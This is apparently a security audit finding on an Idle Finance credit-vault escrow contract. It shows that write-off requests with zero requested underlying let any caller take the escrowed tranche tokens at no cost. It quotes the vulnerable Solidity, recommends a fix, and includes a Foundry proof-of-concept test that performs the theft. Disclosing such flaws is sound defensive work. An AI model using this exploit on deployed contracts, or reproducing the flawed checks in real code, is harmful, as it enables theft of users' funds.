### Title

Zero-underlying write-off requests let any fulfiller steal escrowed tranche tokens - (`contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary

`createWriteOffRequest` rejects a zero tranche amount but accepts `underlyingsRequested == 0`, allowing a lender’s nonzero tranche deposit to be escrowed with zero required consideration. [1](#0-0)  `fullfillWriteOffRequest` then accepts `_underlyings == 0`, deletes the request, and transfers all escrowed tranche tokens to an arbitrary fulfiller. [2](#0-1) 

### Finding Description

During a running epoch, `createWriteOffRequest` transfers `amount` tranche tokens from the lender to the escrow and stores the requested aggregate underlying amount without checking that it is nonzero. [1](#0-0) 

Any wallet can call `fullfillWriteOffRequest`; its validation only requires the stored tranche amount to match exactly and the supplied underlying amount to be at least the stored request. [3](#0-2) 

For a zero-underlying request, `_underlyings == 0` passes that check, produces no fulfiller payment and no lender payout, and still releases `_tranches` to `msg.sender`. [4](#0-3) 

This violates the escrow’s one-request-one-exchange invariant: nonzero escrowed collateral can leave the contract without any corresponding underlying consideration.

### Impact Explanation

An unprivileged fulfiller can steal the full escrowed tranche balance with a single transaction and zero capital. For `T` escrowed tranche tokens, the immediate loss is approximately:

```solidity
T * cdoEpoch.tranchePrice(tranche) / 1e18
```

For example, a `10_000e18` AA-tranche request priced at `1 USDC` results in a `10_000 USDC` claim being transferred to the attacker for `0 USDC`.

### Likelihood Explanation

Exploitation requires a lender to create a write-off request with `underlyingsRequested == 0`, which can result from a phishing flow, malicious frontend, malformed integration call, or compromised account/session. Once such a request exists, any fulfiller can atomically claim the escrowed tranches before the lender calls `deleteWriteOffRequest`. [2](#0-1) 

### Recommendation

Reject zero-value exchanges when the request is created:

```solidity
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Also reject `currentRequest.underlyings == 0` or `_underlyings == 0` in `fullfillWriteOffRequest` so legacy zero-priced requests cannot be drained. Add fork coverage proving that both creating and fulfilling a zero-underlying request revert.

### Proof of Concept

Insert this test into `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`:

```solidity
function testZeroUnderlyingRequestAllowsFreeTrancheTheft() external {
    address attacker = makeAddr("attacker");
    uint256 requestedTranches = 10_000e18;

    uint256 lpUnderlyingPre = underlying.balanceOf(LP);
    uint256 attackerUnderlyingPre = underlying.balanceOf(attacker);
    uint256 attackerTranchePre = tranche.balanceOf(attacker);

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    (uint256 escrowedTranches, uint256 requestedUnderlyings) =
        escrow.userRequests(LP);
    assertEq(escrowedTranches, requestedTranches);
    assertEq(requestedUnderlyings, 0);
    assertEq(tranche.balanceOf(address(escrow)), requestedTranches);

    uint256 stolenValue =
        requestedTranches * cdoEpoch.tranchePrice(address(tranche)) / ONE_TRANCHE;
    assertGt(stolenValue, 0);

    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    assertEq(tranche.balanceOf(attacker) - attackerTranchePre, requestedTranches);
    assertEq(tranche.balanceOf(address(escrow)), 0);
    assertEq(underlying.balanceOf(attacker), attackerUnderlyingPre);
    assertEq(underlying.balanceOf(LP), lpUnderlyingPre);

    (escrowedTranches, requestedUnderlyings) = escrow.userRequests(LP);
    assertEq(escrowedTranches, 0);
    assertEq(requestedUnderlyings, 0);
}
```

```text
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
```

```text
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
```
